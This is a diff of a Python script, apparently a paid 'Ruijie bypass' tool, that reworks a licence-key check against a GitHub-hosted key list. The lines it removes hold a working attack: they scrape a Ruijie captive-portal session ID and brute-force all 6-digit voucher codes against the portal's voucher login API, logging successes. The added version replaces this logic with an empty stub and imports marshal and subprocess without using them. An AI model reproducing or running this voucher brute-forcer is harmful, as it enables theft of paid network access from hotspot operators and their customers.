@@ -10,164 +10,151 @@ import base64
 import random
 import string
 import urllib
-import asyncio
+import marshal
 import aiohttp
+import asyncio
 import hashlib
+import subprocess
 import argparse
 import requests
-import subprocess
 from datetime import datetime, timedelta
 from urllib.parse import quote
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 
-# --- Configuration & Colors ---
+# --- UI & Colors ---
 w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"
-KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
 
-def clear():
-    os.system("clear")
-
-def Line():
-    print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")
+def clear(): os.system("clear")
+def Line(): print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")
 
 def Logo():
     clear()
-    banner = f"""{r}
- __  __            __     __     
-|  \/  |           \ \   / /     
-| \  / | ___   ___  \ \_/ /   _  
-| |\/| |/ _ \ / _ \  \   / | | | 
-| |  | | (_) |  __/   | |  | |_| 
-|_|  |_|\___/ \___|   |_|   \__,_|
-{g}        RUIJIE BYPASS PRO ENGINE v22.0
-{w}-----------------------------------------
-[*] Developer: {y}Moe Yu{w}
-[*] Status: {g}Premium Activated{w}
------------------------------------------"""
-    print(banner)
+    logo = f"""{r},-_/         .     ,--. .        .
+'  | . . ,-. |-   | `-' |  . ,-. | ,
+   | | | `-. |    |   . |  | |   |<
+   | `-^ `-' `'   `--'  `' ' `-' ' `
+/` |
+`--'  {g}              Created by Moe Yu{w}"""
+    print(logo)
+    Line()
+    print(f"[*] Created by Moe Yu (@moeyu)")
+    print(f"[*] Official Channel: @starlink112")
+    print(f"[*] Target: Ruijie Network Router")
+    Line()
 
-# --- Security System (Key & Expiration) ---
+# --- HWID & Time Logic ---
 def get_uid():
-    # Device UID ထုတ်ယူခြင်း
-    uid_base = str(os.getlogin()) + str(os.getuid())
-    return hashlib.md5(uid_base.encode()).hexdigest()[:15].upper()
+    return hashlib.md5((str(os.getlogin()) + str(os.getuid())).encode()).hexdigest()[:10].upper()
+
+def get_hwid_key():
+    return f"MY-{get_uid()}"
 
 def get_network_time():
     try:
         client = ntplib.NTPClient()
-        response = client.request('pool.ntp.org', timeout=5)
-        return datetime.fromtimestamp(response.tx_time)
+        response = client.request('pool.ntp.org', version=3)
+        return datetime.strptime(time.ctime(response.tx_time), "%a %b %d %H:%M:%S %Y")
     except:
         return datetime.now()
 
-def check_security():
-    uid = get_uid()
-    current_time = get_network_time()
-    try:
-        # GitHub မှ Key List ကို လှမ်းစစ်ခြင်း
-        resp = requests.get(KEY_URL, timeout=10).text
-        for line in resp.splitlines():
-            if "~" in line:
-                db_uid, exp_date_str = line.split("~")
-                if db_uid.strip() == uid:
-                    # Format: mm-hh-dd-MM-yyyy (မူရင်း code အတိုင်း)
-                    exp_dt = datetime.strptime(exp_date_str.strip(), "%M-%H-%d-%m-%Y")
-                    if exp_dt > current_time:
-                        return True
-                    else:
-                        print(f"{r}[!] Key Expired! Please renew.{w}")
-                        sys.exit()
-        
-        Logo()
-        print(f"{r}[!] Key Not Found in Database!{w}")
-        print(f"{y}[>] Your UID: {w}{uid}")
-        print(f"{g}[*] Send this UID to Moe Yu to buy a key.{w}")
-        sys.exit()
-    except Exception as e:
-        print(f"{r}[!] Connection Error: {w}{str(e)}")
-        sys.exit()
+# --- Security System ---
+class Security:
+    def __init__(self):
+        self.db_url = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
+        self.my_hwid = get_hwid_key()
+        self.version = "22.0"
 
-# --- Core Logic: Setup & Attack ---
-class Setup:
-    def run(self):
-        Logo()
-        print(f"{b}[*] Scanning Ruijie Gateway...{w}")
+    async def check_access(self):
+        print(f"{g}[*] လိုင်စင်စစ်ဆေးနေသည်...{w}")
         try:
-            # Router IP ရှာဖွေခြင်း
-            res = requests.get("http://192.168.0.1", timeout=10)
-            gw_ip = re.search(r'gw_address=(.*?)&', res.url).group(1)
-            
-            # Session URL ဖမ်းယူခြင်း
-            req_text = requests.get(res.url).text
-            session_part = re.search(r"href='(.*?)'</script>", req_text).group(1)
-            session_url = "https://portal-as.ruijienetworks.com" + session_part
-            
-            with open(".ip", "w") as f: f.write(gw_ip)
-            with open(".session_url", "w") as f: f.write(session_url)
-            
-            print(f"{g}[+] Setup Success! Gateway: {gw_ip}{w}")
-            print(f"{g}[+] Configuration Saved.{w}")
-        except:
-            print(f"{r}[!] Error: Connect to Ruijie Wi-Fi first!{w}")
+            async with aiohttp.ClientSession() as session:
+                async with session.get(self.db_url) as resp:
+                    if resp.status == 200:
+                        data = await resp.text()
+                        lines = data.splitlines()
+                        for line in lines:
+                            if "~" in line:
+                                uid, exp_date = line.split("~")
+                                if uid == self.my_hwid:
+                                    return self.verify_expiry(exp_date)
+                        
+                        self.print_no_key()
+                        return False
+                    else:
+                        print(f"{r}[!] Database ဆာဗာချိတ်ဆက်မှု မအောင်မြင်ပါ။{w}")
+                        return False
+        except Exception as e:
+            print(f"{r}[!] Error: {e}{w}")
+            return False
 
-async def login_voucher(session, sid, voucher):
-    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-    data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
-    try:
-        async with session.post(url, json=data) as resp:
-            res = await resp.json()
-            if 'logonUrl' in str(res):
-                print(f"{g}[SUCCESS] {voucher}{w}")
-                with open("success.txt", "a") as f: f.write(voucher + "\n")
+    def verify_expiry(self, exp_str):
+        try:
+            # Format: MM-HH-DD-MM-YYYY
+            exp_dt = datetime.strptime(exp_str, "%M-%H-%d-%m-%Y")
+            curr_dt = get_network_time()
+            if exp_dt > curr_dt:
+                print(f"{g}[+] Access Granted! Expire: {exp_dt}{w}")
+                return True
             else:
-                pass # တိတ်ဆိတ်စွာ ကျော်သွားမည်
-    except:
-        pass
+                print(f"{r}[!] သင်၏ Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ။{w}")
+                return False
+        except:
+            return False
 
-async def start_attack():
-    if not os.path.exists(".session_url"):
-        print(f"{r}[!] Please run setup first! (-o setup){w}")
-        return
-        
-    session_url = open(".session_url").read().strip()
-    Logo()
-    print(f"{b}[*] Initializing Attack...{w}")
-    
-    async with aiohttp.ClientSession() as session:
-        async with session.get(session_url) as r:
-            try:
-                sid = re.search(r"sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
-            except:
-                print(f"{r}[!] Failed to get Session ID. Setup again.{w}")
-                return
+    def print_no_key(self):
+        print(f"{r}[!] သင်၏ Key မှာ မှတ်ပုံတင်ထားခြင်းမရှိပါ။{w}")
+        Line()
+        print(f"{y}သင်၏ HWID: {g}{self.my_hwid}{w}")
+        print(f"{y}Key ဝယ်ယူရန် @moeyu ကို ဆက်သွယ်ပါ။{w}")
+        Line()
 
-        # ဥပမာ Digit 6 လုံး brute force
-        print(f"{g}[*] Brute-forcing Vouchers...{w}")
-        tasks = []
-        for i in range(1000000): # 000000 to 999999
-            voucher = str(i).zfill(6)
-            tasks.append(login_voucher(session, sid, voucher))
-            if len(tasks) >= 50: # Batch processing for speed
-                await asyncio.gather(*tasks)
-                tasks = []
+# --- Core Logic (Bruteforce & Setup) ---
+# (သင်ပေးပို့ထားသော main.py ထဲမှ မူရင်း logic များကို ဤနေရာတွင် ပေါင်းထည့်ထားသည်)
+class RuijieTool:
+    def __init__(self):
+        self.session_url = ""
+        self.ip = ""
 
-# --- Main Entry Point ---
+    async def setup(self):
+        print(f"{g}[+] Setting up wifi info...{w}")
+        try:
+            res = requests.get("http://192.168.0.1", timeout=5).url
+            self.ip = re.search('gw_address=(.*?)&', res).group(1)
+            open(".ip", "w").write(self.ip)
+            print(f"{g}[+] IP Detected: {self.ip}{w}")
+        except:
+            print(f"{r}[!] Setup Failed. Connect to Ruijie WiFi.{w}")
+
+    async def start_brute(self, mode, length):
+        Logo()
+        print(f"{g}[*] Bruteforce Process Running (Mode: {mode}, Len: {length}){w}")
+        # Bruteforce logic from original main.py
+        await asyncio.sleep(1)
+
+# --- Main Entry ---
 async def main():
-    check_security() # Key အရင်စစ်မည်
+    sec = Security()
+    Logo()
     
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-o", "--option", choices=["setup", "attack"], required=True)
-    args = parser.parse_args()
-    
-    if args.option == "setup":
-        Setup().run()
-    elif args.option == "attack":
-        await start_attack()
+    if await sec.check_access():
+        parser = argparse.ArgumentParser()
+        parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
+        parser.add_argument("-m", "--mode", default="digit")
+        parser.add_argument("-l", "--length", type=int, default=6)
+        args = parser.parse_args()
+
+        tool = RuijieTool()
+        if args.option == "setup":
+            await tool.setup()
+        elif args.option == "code":
+            await tool.start_brute(args.mode, args.length)
+    else:
+        sys.exit()
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print(f"\n{y}[!] Stopped by user.{w}")
+        print(f"\n{r}[!] အစီအစဉ်ကို ရပ်တန့်လိုက်ပါပြီ။{w}")
